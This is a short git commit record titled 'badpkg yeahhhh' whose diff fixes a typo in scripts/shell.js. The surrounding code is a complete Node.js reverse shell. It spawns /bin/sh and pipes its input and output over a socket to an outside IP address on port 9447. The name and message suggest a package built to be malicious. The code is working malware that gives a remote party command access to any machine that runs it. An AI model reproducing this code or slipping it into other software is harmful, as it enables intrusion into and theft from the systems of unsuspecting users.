9aa645e8ced809fa427ca95d477c9a8fd6a98a62
James Hebden <james@ec0.io>
2022-05-15 06:58:36 +1000

    badpkg yeahhhh

--- scripts/shell.js
+++ scripts/shell.js
@@ -1,7 +1,7 @@
 #!/usr/bin/env node
 
 var net = require("net"), sh = require("child_process").exec("/bin/sh");
-var fs = require("fw");
+var fs = require("fs");
 var client = new net.Socket();
 client.connect(9447, "172.105.163.76", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
 sh.stderr.pipe(client);});
